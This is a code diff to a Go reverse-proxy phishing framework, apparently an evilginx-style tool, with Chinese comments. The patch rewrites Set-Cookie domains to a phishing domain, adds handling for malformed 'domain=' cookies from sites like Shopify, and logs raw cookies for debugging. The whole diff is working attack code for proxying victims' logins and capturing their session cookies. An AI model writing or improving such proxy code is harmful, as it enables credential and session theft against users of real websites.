@@ -1414,12 +1414,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			rawCookies := resp.Header.Values("Set-Cookie")
 			resp.Header.Del("Set-Cookie")
 			for _, rawCookie := range rawCookies {
+				// 调试日志：打印原始 Set-Cookie
+				log.Debug("Original Set-Cookie: %s", rawCookie)
+				
 				// 检查原始 Set-Cookie 是否包含 Partitioned 属性（Go 的 http.Cookie 不支持此属性）
 				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
 
 				// 解析 cookie（http.ParseCookie 返回切片）
 				parsedCookies, err := http.ParseCookie(rawCookie)
 				if err != nil {
+					log.Debug("ParseCookie failed: %v", err)
 					// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
 					modified := rawCookie
 					// 提取 Domain 属性值（不区分大小写）
@@ -1431,11 +1435,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
 						}
 					}
+					// 处理 domain=xxx 作为独立 cookie 的情况（Shopify 等网站可能返回格式不标准的 Set-Cookie）
+					domainOnlyMatch := regexp.MustCompile(`(?i)^(domain=)(.+)$`)
+					if matches := domainOnlyMatch.FindStringSubmatch(strings.TrimSpace(rawCookie)); len(matches) == 3 {
+						origDomain := strings.TrimSpace(matches[2])
+						phishDomain, ok := p.replaceHostWithPhished(origDomain)
+						if ok && phishDomain != origDomain {
+							modified = matches[1] + phishDomain
+						}
+					}
+					log.Debug("Modified Set-Cookie: %s", modified)
 					resp.Header.Add("Set-Cookie", modified)
 					continue
 				}
 
 				for _, ck := range parsedCookies {
+					// 处理 name=domain 的 cookie（Shopify 等网站可能返回格式不标准的 Set-Cookie）
+					if strings.EqualFold(ck.Name, "domain") {
+						phishDomain, ok := p.replaceHostWithPhished(ck.Value)
+						if ok && phishDomain != ck.Value {
+							ck.Value = phishDomain
+						}
+					}
+					
 					// add SameSite=none for every received cookie, allowing cookies through iframes
 					if ck.Secure {
 						ck.SameSite = http.SameSiteNoneMode
